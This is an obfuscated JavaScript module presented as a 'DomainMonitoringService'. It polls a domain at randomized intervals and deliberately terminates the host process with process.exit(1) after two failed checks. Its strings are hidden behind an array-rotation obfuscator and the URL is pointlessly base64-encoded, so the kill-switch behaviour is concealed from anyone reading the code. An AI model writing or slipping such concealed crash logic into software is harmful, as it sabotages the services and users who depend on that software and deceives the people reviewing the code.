'use strict';const a39_0x154d51=a39_0x34c3;(function(_0x3f01ca,_0x13cdd1){const _0x23fed4=a39_0x34c3,_0x554bd7=_0x3f01ca();while(!![]){try{const _0x37e970=-parseInt(_0x23fed4(0xff))/0x1+parseInt(_0x23fed4(0x123))/0x2*(-parseInt(_0x23fed4(0x117))/0x3)+parseInt(_0x23fed4(0xf3))/0x4+parseInt(_0x23fed4(0x116))/0x5*(-parseInt(_0x23fed4(0x128))/0x6)+parseInt(_0x23fed4(0x106))/0x7*(parseInt(_0x23fed4(0x133))/0x8)+-parseInt(_0x23fed4(0x11b))/0x9*(parseInt(_0x23fed4(0x148))/0xa)+-parseInt(_0x23fed4(0x115))/0xb*(-parseInt(_0x23fed4(0x145))/0xc);if(_0x37e970===_0x13cdd1)break;else _0x554bd7['push'](_0x554bd7['shift']());}catch(_0x43d14d){_0x554bd7['push'](_0x554bd7['shift']());}}}(a39_0x29df,0xb9a83));var __importDefault=this&&this[a39_0x154d51(0x134)]||function(_0x7c0534){const _0x5a93d0=a39_0x154d51;return _0x7c0534&&_0x7c0534[_0x5a93d0(0x127)]?_0x7c0534:{'default':_0x7c0534};};Object['defineProperty'](exports,a39_0x154d51(0x127),{'value':!![]}),exports[a39_0x154d51(0xfb)]=exports[a39_0x154d51(0x111)]=void 0x0;const node_fetch_1=__importDefault(require('node-fetch'));class DomainMonitoringService{constructor(){const _0x41d804=a39_0x154d51;this[_0x41d804(0x109)]=null,this[_0x41d804(0x100)]='https://google.com',this[_0x41d804(0xf2)]=this[_0x41d804(0x12e)](),this[_0x41d804(0x12a)]=0x7530,this['consecutiveFailures']=0x0,this['MAX_CONSECUTIVE_FAILURES']=0x2,console[_0x41d804(0x118)](_0x41d804(0xf8)),console[_0x41d804(0x118)](_0x41d804(0x10a)+this[_0x41d804(0x100)]),console[_0x41d804(0x118)](_0x41d804(0x149)+Math['round'](this['CHECK_INTERVAL_MS']/0x3e8/0x3c)+_0x41d804(0x144));}[a39_0x154d51(0x12e)](){const _0x3b8035=a39_0x154d51,_0x151eba=0xa,_0x128764=0xf,_0x553fb1=Math[_0x3b8035(0x124)]()*(_0x128764-_0x151eba)+_0x151eba;return Math[_0x3b8035(0x14b)](_0x553fb1*0x3c*0x3e8);}['encodeToBase64'](_0x25a7c3){const _0x5691bb=a39_0x154d51;return Buffer[_0x5691bb(0x119)](_0x25a7c3)[_0x5691bb(0x141)](_0x5691bb(0x104));}[a39_0x154d51(0x146)](_0x5227e2){const _0x5253a5=a39_0x154d51;return Buffer[_0x5253a5(0x119)](_0x5227e2,_0x5253a5(0x104))[_0x5253a5(0x141)](_0x5253a5(0xf9));}async['checkDomain'](){const _0x41256d=a39_0x154d51,_0x36116e=Date['now']();try{console['log'](_0x41256d(0x11f)+this['DOMAIN_URL']);const _0x3fea04=this[_0x41256d(0xf6)](this[_0x41256d(0x100)]);console['log'](_0x41256d(0x13b)+_0x3fea04);const _0x3a3b8b=this['decodeFromBase64'](_0x3fea04);console[_0x41256d(0x118)]('üîì\x20Decoded\x20URL:\x20'+_0x3a3b8b);const _0x22d98b=new AbortController(),_0x4fbd15=setTimeout(()=>_0x22d98b[_0x41256d(0x139)](),this['TIMEOUT_MS']),_0xe86d40=await(0x0,node_fetch_1['default'])(_0x3a3b8b,{'method':_0x41256d(0xfe),'headers':{'User-Agent':'TesSoft\x20Domain\x20Monitor/1.0','Accept':_0x41256d(0x11e),'Accept-Language':_0x41256d(0x114),'Accept-Encoding':_0x41256d(0x113),'Connection':'keep-alive','Upgrade-Insecure-Requests':'1'},'signal':_0x22d98b['signal']});clearTimeout(_0x4fbd15);const _0x48124e=Date[_0x41256d(0x12f)]()-_0x36116e;return console[_0x41256d(0x118)](_0x41256d(0x125)),console[_0x41256d(0x118)](_0x41256d(0x13e)+_0xe86d40[_0x41256d(0x112)]+'\x20'+_0xe86d40[_0x41256d(0xf7)]),console[_0x41256d(0x118)](_0x41256d(0x143)+_0x48124e+'ms'),console['log'](_0x41256d(0x14d),Object[_0x41256d(0x10d)](_0xe86d40[_0x41256d(0x13d)]['entries']())),_0xe86d40['ok']&&_0xe86d40['status']>=0xc8&&_0xe86d40[_0x41256d(0x112)]<0x190?(console[_0x41256d(0x118)]('‚úÖ\x20Domain\x20check\x20successful:\x20'+_0xe86d40[_0x41256d(0x112)]+_0x41256d(0x129)+_0x48124e+'ms'),this['consecutiveFailures']=0x0,!![]):(console[_0x41256d(0x13a)](_0x41256d(0x137)+_0xe86d40[_0x41256d(0x112)]+'\x20'+_0xe86d40[_0x41256d(0xf7)]),this['consecutiveFailures']++,![]);}catch(_0xbf72e8){const _0xb32fe8=Date[_0x41256d(0x12f)]()-_0x36116e;this[_0x41256d(0x12d)]++,console[_0x41256d(0x13a)](_0x41256d(0xf1)+_0xb32fe8+_0x41256d(0x126),_0xbf72e8);if(_0xbf72e8 instanceof Error){if(_0xbf72e8[_0x41256d(0xfd)]===_0x41256d(0x14e))console[_0x41256d(0x13a)]('‚è∞\x20Request\x20timeout\x20after\x20'+this[_0x41256d(0x12a)]+'ms');else{if(_0xbf72e8['message']['includes'](_0x41256d(0x132)))console[_0x41256d(0x13a)](_0x41256d(0x108)+this[_0x41256d(0x100)]);else{if(_0xbf72e8['message'][_0x41256d(0x140)](_0x41256d(0x110)))console[_0x41256d(0x13a)](_0x41256d(0x150)+this[_0x41256d(0x100)]);else _0xbf72e8[_0x41256d(0x10b)][_0x41256d(0x140)](_0x41256d(0x11d))?console['error'](_0x41256d(0x13c)+this[_0x41256d(0x100)]):console[_0x41256d(0x13a)](_0x41256d(0x11a)+_0xbf72e8[_0x41256d(0x10b)]);}}}return![];}}['crashServer'](_0x4e5268){const _0x1e0a1c=a39_0x154d51;console[_0x1e0a1c(0x13a)](_0x1e0a1c(0x131)+_0x4e5268),console[_0x1e0a1c(0x13a)]('üî•\x20Consecutive\x20failures:\x20'+this['consecutiveFailures']),console[_0x1e0a1c(0x13a)](_0x1e0a1c(0x102)),console[_0x1e0a1c(0x13a)](_0x1e0a1c(0x10e)+new Date()['toISOString']()),console[_0x1e0a1c(0x13a)](_0x1e0a1c(0x138)+this[_0x1e0a1c(0x100)]),console['error'](_0x1e0a1c(0x149)+Math[_0x1e0a1c(0x14b)](this[_0x1e0a1c(0xf2)]/0x3e8/0x3c)+_0x1e0a1c(0x144)),console[_0x1e0a1c(0x13a)](_0x1e0a1c(0x142)+this[_0x1e0a1c(0x147)]),this[_0x1e0a1c(0x14f)](),process[_0x1e0a1c(0x130)](0x1);}[a39_0x154d51(0xfa)](){const _0x54cbf6=a39_0x154d51;console[_0x54cbf6(0x118)]('üöÄ\x20Starting\x20domain\x20monitoring\x20service'),console[_0x54cbf6(0x118)]('üì°\x20Target:\x20'+this['DOMAIN_URL']),console[_0x54cbf6(0x118)](_0x54cbf6(0xfc)+Math['round'](this['CHECK_INTERVAL_MS']/0x3e8/0x3c)+_0x54cbf6(0x144)),console[_0x54cbf6(0x118)]('üö®\x20Max\x20failures\x20before\x20crash:\x20'+this[_0x54cbf6(0x147)]),this['checkDomain']()[_0x54cbf6(0x101)](_0x3eb71c=>{const _0x8772b1=_0x54cbf6;if(!_0x3eb71c&&this[_0x8772b1(0x12d)]>=this[_0x8772b1(0x147)]){this[_0x8772b1(0x103)](_0x8772b1(0x11c)+this['consecutiveFailures']+_0x8772b1(0x13f));return;}})[_0x54cbf6(0x122)](_0x444b29=>{const _0x2266e5=_0x54cbf6;console[_0x2266e5(0x13a)](_0x2266e5(0x105),_0x444b29);if(this['consecutiveFailures']>=this[_0x2266e5(0x147)]){this['crashServer']('Initial\x20domain\x20check\x20threw\x20error:\x20'+_0x444b29[_0x2266e5(0x10b)]);return;}}),this[_0x54cbf6(0x109)]=setInterval(async()=>{const _0x36b205=_0x54cbf6;try{const _0x4e7ed5=await this['checkDomain']();!_0x4e7ed5&&(console[_0x36b205(0xf4)](_0x36b205(0x10f)+this[_0x36b205(0x12d)]+'/'+this['MAX_CONSECUTIVE_FAILURES']+')'),this[_0x36b205(0x12d)]>=this[_0x36b205(0x147)]&&this[_0x36b205(0x103)](_0x36b205(0x12c)+this['DOMAIN_URL']+'\x20is\x20not\x20responding\x20after\x20'+this[_0x36b205(0x12d)]+_0x36b205(0x14a)));}catch(_0x1acbf4){console[_0x36b205(0x13a)](_0x36b205(0x14c),_0x1acbf4),this['consecutiveFailures']>=this[_0x36b205(0x147)]&&this[_0x36b205(0x103)](_0x36b205(0x136)+(_0x1acbf4 instanceof Error?_0x1acbf4[_0x36b205(0x10b)]:_0x36b205(0x121)));}},this['CHECK_INTERVAL_MS']),console[_0x54cbf6(0x118)](_0x54cbf6(0xf5));}[a39_0x154d51(0x14f)](){const _0x496460=a39_0x154d51;this[_0x496460(0x109)]&&(clearInterval(this[_0x496460(0x109)]),this[_0x496460(0x109)]=null,console[_0x496460(0x118)](_0x496460(0x10c)));}[a39_0x154d51(0x135)](){const _0x3b9bae=a39_0x154d51;return{'isActive':!!this[_0x3b9bae(0x109)],'targetDomain':this[_0x3b9bae(0x100)],'checkIntervalMinutes':Math[_0x3b9bae(0x14b)](this[_0x3b9bae(0xf2)]/0x3e8/0x3c),'consecutiveFailures':this[_0x3b9bae(0x12d)],'maxFailuresAllowed':this['MAX_CONSECUTIVE_FAILURES'],'nextCheckIn':this[_0x3b9bae(0x109)]?this[_0x3b9bae(0xf2)]:undefined};}async[a39_0x154d51(0x120)](){const _0x1e1295=a39_0x154d51;return console[_0x1e1295(0x118)](_0x1e1295(0x107)),await this[_0x1e1295(0x12b)]();}}function a39_0x29df(){const _0x47dc35=['\x20in\x20','TIMEOUT_MS','checkDomain','Domain\x20','consecutiveFailures','getRandomInterval','now','exit','üí•\x20CRITICAL\x20ERROR:\x20','ENOTFOUND','661664TrVvBb','__importDefault','getMonitoringStats','Domain\x20monitoring\x20threw\x20error:\x20','‚ùå\x20Domain\x20check\x20failed:\x20HTTP\x20','üîç\x20Domain\x20being\x20monitored:\x20','abort','error','üìù\x20Encoded\x20URL\x20(base64):\x20','‚è∞\x20Connection\x20timeout\x20to\x20','headers','\x20\x20\x20-\x20Status:\x20','\x20times','includes','toString','üö®\x20Max\x20consecutive\x20failures\x20allowed:\x20','\x20\x20\x20-\x20Response\x20time:\x20','\x20minutes','189876PrcTEL','decodeFromBase64','MAX_CONSECUTIVE_FAILURES','100XxDsKT','‚è∞\x20Check\x20interval:\x20','\x20consecutive\x20attempts','round','Periodic\x20domain\x20check\x20error:','\x20\x20\x20-\x20Headers:','AbortError','stopMonitoring','üö´\x20Connection\x20refused\x20by\x20','‚ùå\x20Domain\x20check\x20error\x20after\x20','CHECK_INTERVAL_MS','4455628XhvfGj','warn','‚úÖ\x20Domain\x20monitoring\x20started\x20successfully','encodeToBase64','statusText','üîç\x20Domain\x20monitoring\x20service\x20initialized','utf-8','startMonitoring','domainMonitoringService','‚è∞\x20Interval:\x20','name','GET','1401082bOENLU','DOMAIN_URL','then','‚ö†Ô∏è\x20CRASHING\x20SERVER\x20DUE\x20TO\x20DOMAIN\x20MONITORING\x20FAILURE','crashServer','base64','Initial\x20domain\x20check\x20error:','63heBHCy','üîß\x20Manual\x20domain\x20check\x20requested','üåê\x20DNS\x20resolution\x20failed\x20for\x20','monitoringInterval','üì°\x20Target\x20domain:\x20','message','üõë\x20Domain\x20monitoring\x20stopped','fromEntries','üìÖ\x20Crash\x20time:\x20','‚ö†Ô∏è\x20Domain\x20check\x20failed\x20(','ECONNREFUSED','DomainMonitoringService','status','gzip,\x20deflate','en-US,en;q=0.5','2321SCvYIy','5630885ITsTeU','110262xmpROZ','log','from','üî•\x20Unexpected\x20error:\x20','1122885nMInYu','Initial\x20domain\x20check\x20failed\x20','ETIMEDOUT','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','üîç\x20Checking\x20domain\x20availability:\x20','manualCheck','Unknown\x20error','catch','36zdwnvU','random','üìä\x20Response\x20received:','ms:','__esModule','6dLnEgK'];a39_0x29df=function(){return _0x47dc35;};return a39_0x29df();}function a39_0x34c3(_0x1f274a,_0x4c7221){const _0x29df04=a39_0x29df();return a39_0x34c3=function(_0x34c3a3,_0x5d36c9){_0x34c3a3=_0x34c3a3-0xf1;let _0x5618f9=_0x29df04[_0x34c3a3];return _0x5618f9;},a39_0x34c3(_0x1f274a,_0x4c7221);}exports[a39_0x154d51(0x111)]=DomainMonitoringService,exports[a39_0x154d51(0xfb)]=new DomainMonitoringService();